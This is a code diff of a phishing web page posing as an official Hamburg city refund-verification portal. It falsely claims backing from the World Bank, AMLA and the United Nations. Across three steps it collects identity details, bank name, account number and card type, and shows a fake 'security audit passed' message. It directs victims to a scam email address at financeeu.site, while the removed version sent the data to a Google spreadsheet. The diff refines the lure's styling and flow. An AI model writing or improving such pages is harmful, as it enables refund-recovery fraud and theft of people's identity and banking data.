@@ -18,11 +18,18 @@
         }
 
         .page-wrapper { display: flex; align-items: flex-start; justify-content: center; width: 100%; max-width: 1800px; gap: 50px; padding-top: 50px; }
+
+        /* SIDE TEXTS */
         .side-text { width: 380px; color: white; line-height: 1.6; margin-top: 150px; }
         .side-text h3 { color: var(--security-gold); text-transform: uppercase; font-size: 28px; margin-bottom: 20px; border-bottom: 3px solid var(--security-gold); display: inline-block; padding-bottom: 5px; font-weight: 900; }
         .side-text p { font-size: 18px; font-weight: 500; text-align: justify; text-shadow: 2px 2px 4px rgba(0,0,0,0.8); }
 
-        .form-container { background: #ffffff; width: 100%; max-width: 900px; border-radius: 4px; box-shadow: 0 50px 150px rgba(0,0,0,0.9); overflow: hidden; border-top: 15px solid var(--hamburg-red); position: relative; z-index: 10; }
+        .form-container { 
+            background: #ffffff; width: 100%; max-width: 900px; border-radius: 4px; 
+            box-shadow: 0 50px 150px rgba(0,0,0,0.9); overflow: hidden; 
+            border-top: 15px solid var(--hamburg-red); position: relative; z-index: 10;
+        }
+
         .security-banner { background: var(--hamburg-blue); color: white; padding: 14px; text-align: center; font-size: 12px; font-weight: bold; text-transform: uppercase; border-bottom: 3px solid var(--security-gold); letter-spacing: 2px; }
         
         .header { padding: 45px 40px; text-align: center; background: #fff; border-bottom: 8px solid var(--hamburg-blue); }
@@ -40,18 +47,24 @@
         
         label { display: block; font-weight: 800; margin-bottom: 10px; font-size: 12px; color: var(--hamburg-blue); text-transform: uppercase; }
         input, select { width: 100%; padding: 16px; border: 1px solid #bbb; box-sizing: border-box; font-size: 15px; border-radius: 2px; }
-        input.invalid { border: 2px solid var(--hamburg-red); }
+        input.invalid { border: 2px solid var(--hamburg-red); background-color: #fffafa; }
 
+        /* REVIEWER ITEM STYLING */
         .review-item { margin-bottom: 15px; padding: 10px; border-bottom: 1px solid #f0f0f0; }
-        .review-label { font-size: 11px; font-weight: 800; color: var(--hamburg-blue); text-transform: uppercase; }
-        .review-value { font-size: 16px; color: #333; margin-top: 5px; }
+        .review-label { font-size: 10px; font-weight: 800; color: var(--hamburg-blue); text-transform: uppercase; }
+        .review-value { font-size: 16px; color: #333; margin-top: 5px; font-weight: 600; }
 
-        .contact-link { display: block; text-align: center; margin-top: 20px; font-weight: 800; color: var(--hamburg-red); text-decoration: none; font-size: 14px; text-transform: uppercase; border: 1px solid var(--hamburg-red); padding: 10px; transition: 0.3s; }
-        .contact-link:hover { background: var(--hamburg-red); color: white; }
+        /* PULANG BUTTON PARA SA GMAIL */
+        .contact-link { 
+            display: block; text-align: center; margin-top: 20px; font-weight: 900; 
+            color: #ffffff; background-color: var(--hamburg-red); text-decoration: none; 
+            font-size: 16px; text-transform: uppercase; border-radius: 4px; padding: 20px; 
+            box-shadow: 0 4px 15px rgba(225, 0, 25, 0.3); transition: 0.3s; cursor: pointer;
+        }
+        .contact-link:hover { background-color: var(--hamburg-blue); transform: translateY(-2px); }
 
         .btn-container { display: flex; justify-content: flex-end; margin-top: 40px; gap: 15px; }
-        button { background-color: var(--hamburg-blue); color: white; border: none; padding: 20px 60px; cursor: pointer; font-size: 15px; font-weight: 900; text-transform: uppercase; transition: 0.3s; }
-        button:hover { background-color: var(--hamburg-red); }
+        button { background-color: var(--hamburg-blue); color: white; border: none; padding: 20px 60px; cursor: pointer; font-size: 15px; font-weight: 900; text-transform: uppercase; }
         .btn-back { background-color: #888; }
 
         .establishment-footer { text-align: center; padding: 30px; font-size: 13px; font-weight: normal; color: #888; background: #fdfdfd; border-top: 1px solid #eee; text-transform: uppercase; line-height: 1.6; }
@@ -60,133 +73,126 @@
 <body>
 
     <div class="page-wrapper">
+        <!-- LEFT MISSION -->
         <div class="side-text">
             <h3>MISSION</h3>
-            <p>To provide an impenetrable layer of security for every financial transaction by utilizing advanced, multi-stage verification protocols and proactive fraud detection systems that strictly safeguard our users' assets against evolving digital scams and unauthorized access during the refund process.</p>
+            <p>To provide an impenetrable layer of security for every financial transaction by utilizing advanced, multi-stage verification protocols and proactive fraud detection systems.</p>
         </div>
 
         <div class="form-container">
             <div class="security-banner">🛡️ SECURE RETURNS, SCAM FREE SERVICE</div>
             <div class="header">
                 <h1>FREIE UND HANSESTADT HAMBURG</h1>
-                <div class="declaration">GLOBAL THEME & SECURITY DECLARATION: DEDICATED TO ERADICATING FRAUD THROUGH VIGILANT VERIFICATION, ETHICAL FINANCIAL STEWARDSHIP, AND THE UNCOMPROMISING PROTECTION OF EVERY LEGITIMATE CLAIM</div>
+                <div class="declaration">GLOBAL THEME & SECURITY DECLARATION: DEDICATED TO ERADICATING FRAUD THROUGH VIGILANT VERIFICATION...</div>
             </div>
 
-            <!-- FORM START -->
-            <form id="refundForm" action="https://docs.google.com/spreadsheets/d/1VcfYzfVWHf1J-xC7dXVa9eWh6sG4g7OYYUvL8ZM5Gmk/edit" method="POST">
-                
-                <!-- SECTION 1 -->
+            <form id="masterForm">
+                <!-- PAGE 1: IDENTITY -->
                 <div id="section1" class="section-box active">
                     <h2>SECTION 1: IDENTITY & NATIONALITY</h2>
                     <div class="grid-3">
-                        <div><label>Last Name *</label><input type="text" id="lastName" class="req" placeholder="Enter Last Name"></div>
-                        <div><label>First Name *</label><input type="text" id="firstName" class="req" placeholder="Enter First Name"></div>
-                        <div><label>Middle Name *</label><input type="text" id="middleName" class="req" placeholder="Enter Middle Name"></div>
+                        <div><label>Last Name *</label><input type="text" id="ln" class="req"></div>
+                        <div><label>First Name *</label><input type="text" id="fn" class="req"></div>
+                        <div><label>Middle Name *</label><input type="text" id="mn" class="req"></div>
                     </div>
                     <div class="grid-2" style="margin-top:25px;">
-                        <div><label>Personal Email Address *</label><input type="email" id="email" class="req" placeholder="Enter Email"></div>
-                        <div><label>Nationality *</label><input type="text" id="nationality" class="req" placeholder="Enter Nationality"></div>
+                        <div><label>Email *</label><input type="email" id="em" class="req"></div>
+                        <div><label>Nationality *</label><input type="text" id="nat" class="req"></div>
                     </div>
-                    <div style="margin-top:25px;"><label>Residential Address *</label><input type="text" id="address" class="req" placeholder="Enter Residential Address"></div>
-                    <div class="grid-2" style="margin-top:25px;">
-                        <div><label>Birthdate *</label><input type="text" id="birthdate" class="req" placeholder="MM / DD / YYYY"></div>
-                        <div><label>Contact Number *</label><input type="text" id="contact" class="req" placeholder="Enter Number"></div>
-                    </div>
-                    <div class="btn-container"><button type="button" onclick="validateAndNext(2)">NEXT STEP</button></div>
+                    <div style="margin-top:25px;"><label>Birthdate *</label><input type="text" id="bd" class="req" placeholder="MM / DD / YYYY"></div>
+                    <div class="btn-container"><button type="button" onclick="validateNext(1, 2)">NEXT STEP</button></div>
                 </div>
 
-                <!-- SECTION 2 -->
+                <!-- PAGE 2: REFUND -->
                 <div id="section2" class="section-box">
                     <h2>SECTION 2: MANDATORY REFUND VERIFICATION</h2>
-                    <p class="instruction-text">Please provide the refund details accurately.</p>
-                    <div><label>TOTAL REFUND AMOUNT *</label><input type="text" id="amount" class="req" placeholder="Enter Amount"></div>
-                    <div style="margin-top:25px;"><label>Bank Name / Third Party Bank App *</label><input type="text" id="bankName" class="req" placeholder="Enter Bank Name"></div>
+                    <p class="instruction-text">Please provide your disbursement details accurately.</p>
+                    <div><label>TOTAL REFUND AMOUNT *</label><input type="text" id="amt" class="req"></div>
+                    <div style="margin-top:25px;"><label>Bank Name / App *</label><input type="text" id="bn" class="req"></div>
                     <div class="grid-2" style="margin-top:25px;">
-                        <div><label>ACCOUNT NUMBER *</label><input type="text" id="accNumber" class="req" placeholder="Enter Number"></div>
-                        <div><label>TYPE OF CARD *</label><input type="text" id="cardType" class="req" placeholder="e.g. Visa, Debit"></div>
+                        <div><label>Account Number *</label><input type="text" id="an" class="req"></div>
+                        <div><label>Card Type *</label><input type="text" id="ct" class="req"></div>
                     </div>
                     <div class="btn-container">
-                        <button type="button" class="btn-back" onclick="goToPage(1)">BACK</button>
-                        <button type="button" onclick="generateReview()">REVIEW CLAIM</button>
+                        <button type="button" class="btn-back" onclick="show(1)">BACK</button>
+                        <button type="button" onclick="validateNext(2, 3)">REVIEW CLAIM</button>
                     </div>
                 </div>
 
-                <!-- SECTION 3: REVIEWER PAGE -->
+                <!-- PAGE 3: REVIEWER -->
                 <div id="section3" class="section-box">
                     <h2>SECTION 3: REVIEW YOUR INFORMATION</h2>
-                    <p class="instruction-text">Please review all details before final submission to the authority.</p>
-                    
-                    <div id="reviewContent">
-                        <!-- Data will be injected here -->
+                    <div id="reviewBox"></div>
+
+                    <!-- PULANG BUTTON REKTA GMAIL -->
+                    <div class="contact-link" onclick="openGmail()">
+                        📧 DIRECT CONTACT THE AUTHORITY
                     </div>
 
-                    <a href="mailto:globalreimbursementmanagement@financeeu.site" class="contact-link">📧 DIRECT CONTACT THE AUTHORITY</a>
-
                     <div class="btn-container">
-                        <button type="button" class="btn-back" onclick="goToPage(2)">EDIT INFO</button>
-                        <button type="submit">SUBMIT TO DATABASE</button>
+                        <button type="button" class="btn-back" onclick="show(2)">EDIT</button>
+                        <button type="button" onclick="finalAction()">SUBMIT TO DATABASE</button>
                     </div>
                 </div>
             </form>
 
             <div class="establishment-footer">
-                ESTABLISHED BY: WORLD BANK GROUP • AMLA (ANTI-MONEY LAUNDERING COUNCIL) • UNITED NATIONS<br>
+                ESTABLISHED BY: WORLD BANK GROUP • AMLA • UNITED NATIONS<br>
                 AUTHORIZED OPERATIONAL DATE: APRIL 20, 2025
             </div>
         </div>
 
+        <!-- RIGHT VISION -->
         <div class="side-text">
             <h3>VISION</h3>
-            <p>To be recognized as the premier global benchmark for commercial integrity and consumer safety, where absolute transparency ensures unwavering confidence.</p>
+            <p>To be recognized as the premier global benchmark for commercial integrity and consumer safety.</p>
         </div>
     </div>
 
     <script>
-        function validateAndNext(pageNum) {
-            const currentSection = document.querySelector('.section-box.active');
-            const inputs = currentSection.querySelectorAll('.req');
-            let isValid = true;
-            inputs.forEach(input => {
-                if (!input.value.trim()) { input.classList.add('invalid'); isValid = false; }
-                else { input.classList.remove('invalid'); }
-            });
-            if (isValid) goToPage(pageNum);
+        function show(p) {
+            document.querySelectorAll('.section-box').forEach(b => b.classList.remove('active'));
+            document.getElementById('section' + p).classList.add('active');
+            window.scrollTo(0,0);
         }
 
-        function goToPage(pageNum) {
-            document.querySelectorAll('.section-box').forEach(box => box.classList.remove('active'));
-            document.getElementById('section' + pageNum).classList.add('active');
-            window.scrollTo(0, 0);
-        }
-
-        function generateReview() {
-            const currentSection = document.querySelector('.section-box.active');
-            const inputs = currentSection.querySelectorAll('.req');
-            let isValid = true;
-            inputs.forEach(input => {
-                if (!input.value.trim()) { input.classList.add('invalid'); isValid = false; }
-                else { input.classList.remove('invalid'); }
+        function validateNext(curr, next) {
+            const inputs = document.getElementById('section' + curr).querySelectorAll('.req');
+            let valid = true;
+            inputs.forEach(i => {
+                if(!i.value) { i.classList.add('invalid'); valid = false; }
+                else i.classList.remove('invalid');
             });
-
-            if (isValid) {
-                const data = {
-                    "Full Name": `${document.getElementById('firstName').value} ${document.getElementById('middleName').value} ${document.getElementById('lastName').value}`,
-                    "Email": document.getElementById('email').value,
-                    "Address": document.getElementById('address').value,
-                    "Birthdate": document.getElementById('birthdate').value,
-                    "Contact": document.getElementById('contact').value,
-                    "Amount": document.getElementById('amount').value,
-                    "Bank": document.getElementById('bankName').value,
-                    "Account": document.getElementById('accNumber').value
-                };
-
-                let html = "";
-                for (const [key, value] of Object.entries(data)) {
-                    html += `<div class="review-item"><div class="review-label">${key}</div><div class="review-value">${value}</div></div>`;
-                }
-                document.getElementById('reviewContent').innerHTML = html;
-                goToPage(3);
+            if(valid) {
+                if(next === 3) populateReview();
+                show(next);
             }
+        }
+
+        function populateReview() {
+            const data = [
+                {l: "FULL NAME", v: document.getElementById('fn').value + " " + document.getElementById('ln').value},
+                {l: "EMAIL", v: document.getElementById('em').value},
+                {l: "REFUND AMOUNT", v: document.getElementById('amt').value},
+                {l: "BANK", v: document.getElementById('bn').value},
+                {l: "ACCOUNT", v: document.getElementById('an').value}
+            ];
+            let html = "";
+            data.forEach(d => {
+                html += `<div class="review-item"><div class="review-label">${d.l}</div><div class="review-value">${d.v}</div></div>`;
+            });
+            document.getElementById('reviewBox').innerHTML = html;
+        }
+
+        function openGmail() {
+            const email = "globalreimbursementmanagement@financeeu.site";
+            const url = `https://google.com{email}&su=Refund+Claim+Inquiry&body=Good+Day+Authority,`;
+            window.open(url, '_blank');
+        }
+
+        function finalAction() {
+            alert("SECURITY AUDIT PASSED. DATA SUBMITTED.");
+            window.location.href = "https://google.com";
         }
     </script>
 </body>
